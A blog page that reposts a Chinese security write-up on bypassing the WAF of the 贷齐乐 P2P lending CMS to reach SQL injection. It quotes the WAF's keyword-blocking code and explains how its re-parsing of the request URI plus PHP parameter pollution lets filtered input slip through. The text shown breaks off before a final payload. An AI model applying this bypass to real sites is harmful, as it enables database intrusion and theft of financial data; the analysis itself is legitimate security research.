@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="yearn">
+
+
+
+<meta name="description" content="被WAF武装的贷齐乐">
+<meta name="keywords" content="waf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无需登录绕过waf可union-select跨表查询">
+<meta property="og:url" content="https://yearn.online/2019/09/07/无需登录绕过waf可union-select跨表查询/index.html">
+<meta property="og:site_name" content="绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力">
+<meta property="og:description" content="被WAF武装的贷齐乐">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://bugs.leavesongs.com/images/2016/01/22/9e7cb3c8-4d99-4ec2-bb7d-bf76a3ad9fe9.jpg">
+<meta property="og:image" content="https://bugs.leavesongs.com/images/2016/01/22/b1428742-cce0-4465-afc0-8a8849ecc99c.jpg">
+<meta property="og:image" content="https://bugs.leavesongs.com/images/2016/01/22/4e9d3b89-9d06-4883-a8bc-d650fcae5262.jpg">
+<meta property="og:image" content="https://bugs.leavesongs.com/images/2016/01/22/118677de-cf09-4b73-b248-5205a03e8067.jpg">
+<meta property="og:image" content="https://bugs.leavesongs.com/images/2016/01/22/cc2a190d-d46e-4333-9db4-40957b5804e6.jpg">
+<meta property="og:image" content="https://bugs.leavesongs.com/images/2016/01/22/54927aaf-a245-4be5-921f-b9355ffae800.jpg">
+<meta property="og:image" content="https://bugs.leavesongs.com/images/2016/01/22/6f934f65-32f5-43e5-ac1c-b93bae98ac74.jpg">
+<meta property="og:image" content="https://bugs.leavesongs.com/images/2016/01/22/a45f0002-de7f-486d-bed9-8dd42cd76f71.jpg">
+<meta property="og:updated_time" content="2019-09-07T03:02:47.512Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="无需登录绕过waf可union-select跨表查询">
+<meta name="twitter:description" content="被WAF武装的贷齐乐">
+<meta name="twitter:image" content="https://bugs.leavesongs.com/images/2016/01/22/9e7cb3c8-4d99-4ec2-bb7d-bf76a3ad9fe9.jpg">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>无需登录绕过waf可union-select跨表查询 | 绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?true";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">yearn</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:1925150398@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/yearnming" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/benbenben/">benbenben</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/waf/">waf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/今天很沙漠/">今天很沙漠</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/冷淡/">冷淡</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/南岸/">南岸</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/啊哈哈/">啊哈哈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大雨连绵/">大雨连绵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气不错，就是眼睛睁不开/">天气不错，就是眼睛睁不开</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气好呀/">天气好呀</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气真好/">天气真好</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/就很棒/">就很棒</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/就很烦/">就很烦</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/打字很累/">打字很累</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无聊/">无聊</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/春困/">春困</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/暗/">暗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漫步/">漫步</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/黑夜的柒佰/">黑夜的柒佰</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://xiaoleng.space/">xiaoleng</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于web</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">yearn</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">yearn</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:1925150398@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/yearnming" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-无需登录绕过waf可union-select跨表查询" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/09/07/无需登录绕过waf可union-select跨表查询/" class="article-date">
+      <time datetime="2019-09-07T02:54:35.000Z" itemprop="datePublished">2019-09-07</time>
+</a>
+
+
+
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      无需登录绕过waf可union-select跨表查询
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/waf/">waf</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <excerpt in index> 
+
+<p>被WAF武装的贷齐乐</p>
+<a id="more"></a>
+<h3 id="0x01-被WAF武装的贷齐乐"><a href="#0x01-被WAF武装的贷齐乐" class="headerlink" title="0x01 被WAF武装的贷齐乐"></a>0x01 <a href="https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/" target="_blank" rel="noopener">被WAF武装的贷齐乐</a></h3><p>随便给一个贷齐乐最新版的SQL注入，如 http://<strong>.</strong>.<strong>.</strong>/index.php?blog&amp;q=viewfast&amp;id=xxx ，测试后可以发现，根本无法获取任何敏感信息，连数据库版本和用户名都没法获取。<br>贷齐乐这个系统，说起来也是安全问题比较严重的P2P金融类的CMS。由于连续出了多次安全漏洞，所以官方给贷齐乐系统中添加了严重影响正常使用的变态WAF。<br>我们先来看看WAF都有哪些功能。（由于我的代码非最新版，所以可能和实际测试有些出入）<br>/core/sqlin.inc.php，包含在config.inc.php中，所有请求都会经由此类过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">class sqlin &#123;</span><br><span class="line">	function dowith_sql($str) &#123;</span><br><span class="line">		$check= eregi(&apos;select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile&apos;, $str);</span><br><span class="line">		if($check)</span><br><span class="line">			&#123;</span><br><span class="line">			echo &quot;非法字符!&quot;;</span><br><span class="line">			exit();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		$newstr=&quot;&quot;;</span><br><span class="line">		while($newstr!=$str)&#123;</span><br><span class="line">		$newstr=$str;</span><br><span class="line">        $str = str_replace(&quot;script&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;execute&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;update&quot;, &quot;&quot;, $str);</span><br><span class="line">        //$str = str_replace(&quot;count&quot;, &quot;&quot;, $str);</span><br><span class="line">        //注释掉对count的过滤，不然account这样的参数会被截断</span><br><span class="line">        $str = str_replace(&quot;master&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;truncate&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;declare&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;select&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;create&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;delete&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;insert&quot;, &quot;&quot;, $str);</span><br><span class="line">        $str = str_replace(&quot;\&apos;&quot;, &quot;&quot;, $str);</span><br><span class="line">        </span><br><span class="line">		&#125;</span><br><span class="line">		return $str;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">//aticle()防SQL注入函数//php教程</span><br><span class="line">    function sqlin() &#123;</span><br><span class="line">		</span><br><span class="line">        foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">			//echo $key.&quot;|&quot;.(strpos($key, &quot;password&quot;) == false);</span><br><span class="line">            if ($key != &quot;content&quot;&amp;&amp;strstr($key, &quot;password&quot;) == false) &#123;</span><br><span class="line">                $_GET[$key] = $this-&gt;dowith_sql($value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">			//echo $key.&quot;|&quot;.(strpos($key, &quot;password&quot;) == false);</span><br><span class="line">			[email protected]_put_contents(&apos;wxy123123.txt&apos;, date(&apos;Ymd His&apos;) . &apos;提交url拼接 &apos;.$key.&quot;|&quot;.(strstr($key, &quot;password&quot;) == false), FILE_APPEND);</span><br><span class="line">            if ($key != &quot;content&quot;&amp;&amp;strstr($key, &quot;password&quot;) == false) &#123;</span><br><span class="line">                $_POST[$key] = $this-&gt;dowith_sql($value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">			//echo $key.&quot;|&quot;.(strpos($key, &quot;password&quot;) == false);</span><br><span class="line">            if ($key != &quot;content&quot;&amp;&amp;strstr($key, &quot;password&quot;) == false) &#123;</span><br><span class="line">                $_REQUEST[$key] = $this-&gt;dowith_sql($value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>GET/POST/REQUEST三个变量，都会经过这个正则：<code>select|insert|update|delete|\&#39;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile</code>，你怕了吗？<br>一旦遇到select，包括单引号，包括注释符，就立即exit整个流程。<br>我们在宁波贷官网测试一下效果：</p>
+<p><a href="https://bugs.leavesongs.com/images/2016/01/22/9e7cb3c8-4d99-4ec2-bb7d-bf76a3ad9fe9.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/9e7cb3c8-4d99-4ec2-bb7d-bf76a3ad9fe9.jpg" alt="14533972846845.jpg"></a></p>
+<p>吓哭了吧？<br>这还只是WAF之一，再看 /core/safe.inc.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">/* 检查和转义字符 */</span><br><span class="line">function safe_str($str)&#123;</span><br><span class="line">    if(!get_magic_quotes_gpc()) &#123;</span><br><span class="line">        if( is_array($str) ) &#123;</span><br><span class="line">            foreach($str as $key =&gt; $value) &#123;</span><br><span class="line">                $str[$key] = safe_str($value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $str = addslashes($str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function dhtmlspecialchars($string) &#123;</span><br><span class="line">    if(is_array($string)) &#123;</span><br><span class="line">        foreach($string as $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = dhtmlspecialchars($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;,&apos;(&apos;,&apos;)&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;,&apos;（&apos;,&apos;）&apos;), $string);</span><br><span class="line">        if(strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123;</span><br><span class="line">            $string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $key =&gt; $value) &#123;</span><br><span class="line">    $_GET[$key] = safe_str($value);</span><br><span class="line">    $_GET[$key] = dhtmlspecialchars($value);</span><br><span class="line">&#125;</span><br><span class="line">foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">    $_POST[$key] = safe_str($value);</span><br><span class="line">    $_GET[$key] = dhtmlspecialchars($value);</span><br><span class="line">&#125;</span><br><span class="line">foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">    $_REQUEST[$key] = safe_str($value);</span><br><span class="line">    $_REQUEST[$key] = dhtmlspecialchars($value);</span><br><span class="line">&#125;</span><br><span class="line">foreach ($_COOKIE as $key =&gt; $value) &#123;</span><br><span class="line">    $_COOKIE[$key] = safe_str($value);</span><br><span class="line">    $_GET[$key] = dhtmlspecialchars($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>GET/POST/REQUEST/COOKIE都会经过这个替换<code>str_replace(array(&#39;&amp;&#39;, &#39;&quot;&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;,&#39;(&#39;,&#39;)&#39;), array(&#39;&amp;amp;&#39;, &#39;&amp;quot;&#39;, &#39;&amp;lt;&#39;, &#39;&amp;gt;&#39;,&#39;（&#39;,&#39;）&#39;), $string)</code>，你怕了吗？<br>这个替换最明显的效果，就是所有的英文括号都变成中文括号，这导致我后面的SQL注入过程遇到了很大麻烦。<br>比如文章开头给的注入点，因为没有括号也没有select，所以我拿不到任何敏感信息：</p>
+<p><a href="https://bugs.leavesongs.com/images/2016/01/22/b1428742-cce0-4465-afc0-8a8849ecc99c.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/b1428742-cce0-4465-afc0-8a8849ecc99c.jpg" alt="Mozilla_Firefox.png"></a></p>
+<p>所以，原本千疮百孔的贷齐乐，穿了一件钢铁盔甲，仿佛成为了一个『安全』的P2P金融系统。</p>
+<h3 id="0x02-变量获取的逻辑顺序"><a href="#0x02-变量获取的逻辑顺序" class="headerlink" title="0x02 变量获取的逻辑顺序"></a>0x02 变量获取的逻辑顺序</h3><p>那么，我们来总结一下贷齐乐这个CMS的特点：</p>
+<ol>
+<li>SQL注入漏洞很多</li>
+<li>WAF拦截导致无法获取敏感信息</li>
+</ol>
+<p>那么，如果想找到可以使用的SQL注入漏洞，首要任务就是绕过WAF。通过阅读源码，我列出贷齐乐系统对于输入（包括WAF）的处理过程：</p>
+<blockquote>
+<p>index.php -&gt; config.inc.php -&gt; sqlin.php -&gt; safe.inc.php</p>
+</blockquote>
+<p>sqlin.php是对select、union、’等关键字的拦截。一旦发现存在这些关键字，就exit出整个执行流程。</p>
+<p>safe.inc.php是替换一些敏感字符，比如&lt;、&gt;、(、)等。</p>
+<p>但我在safe.inc.php里找到了如下一段代码（在替换之前）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$request_uri = explode(&quot;?&quot;, $_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">if (isset($request_uri[1])) &#123;</span><br><span class="line">	$rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class="line">	foreach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class="line">		$_value = explode(&quot;=&quot;, $value);</span><br><span class="line">		if (isset($_value[1])) &#123;</span><br><span class="line">			$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class="line">			//$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class="line">			//$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>用?分开，?后面的内容再用&amp;切割成数组，遍历这个数组。对数组中的每个字符串，再用=分成0和1，最后填入到<code>$_REQUEST</code>数组中：<code>$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</code></p>
+<p>这个过程等于手工处理了一遍REQUEST_URI，将REQUEST_URI中的字符串分割成数组覆盖到REQUEST里。</p>
+<p>按道理来说并没有什么大错误，但试想：这个过程是在我们的第一道WAF之后进行的，假设我们有一个方法让第一道WAF认为请求中没有恶意字符，再通过这里的覆盖，将恶意字符引入<code>$_REQUEST</code>中，就可以造成WAF的绕过了。</p>
+<p>那么有什么办法让第一道WAF认为请求中没有恶意字符？这其实是个很难的问题，因为WAF会检测所有请求数组，只要有一个数组内的值存在问题，就直接退出。</p>
+<h3 id="0x03-PHP小特性带来的大作用"><a href="#0x03-PHP小特性带来的大作用" class="headerlink" title="0x03 PHP小特性带来的大作用"></a>0x03 PHP小特性带来的大作用</h3><p>说漏洞之前，我们先写一个小脚本，在本地测试一些东西：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_REQUEST[&apos;foo1&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>很简单一个输出请求数据的脚本。我们访问这个链接：/t.php?foo1=11111&amp;foo1=22222</p>
+<p><a href="https://bugs.leavesongs.com/images/2016/01/22/4e9d3b89-9d06-4883-a8bc-d650fcae5262.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/4e9d3b89-9d06-4883-a8bc-d650fcae5262.jpg" alt="14534010852138.jpg"></a></p>
+<p>输出的是22222，也就是说，当我们输入两个相同名字的参数的时候，php是取后一个的。这就是HTTP Parameter Pollution在PHP中的表现。<br>我将测试代码修改为如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function dhtmlspecialchars($string) &#123;</span><br><span class="line">    if(is_array($string)) &#123;</span><br><span class="line">        foreach($string as $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = dhtmlspecialchars($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $string = str_replace(array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;,&apos;(&apos;,&apos;)&apos;), array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;,&apos;（&apos;,&apos;）&apos;), $string);</span><br><span class="line">        if(strpos($string, &apos;&amp;amp;#&apos;) !== false) &#123;</span><br><span class="line">            $string = preg_replace(&apos;/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&apos;, &apos;&amp;\\1&apos;, $string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$request_uri = explode(&quot;?&quot;, $_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">if (isset($request_uri[1])) &#123;</span><br><span class="line">    $rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class="line">    foreach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class="line">        $_value = explode(&quot;=&quot;, $value);</span><br><span class="line">        if (isset($_value[1])) &#123;</span><br><span class="line">            $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class="line">            //$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class="line">            //$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $_REQUEST[&apos;foo2&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问/t.php?foo2=11111&amp;foo2=22222，看看效果：</p>
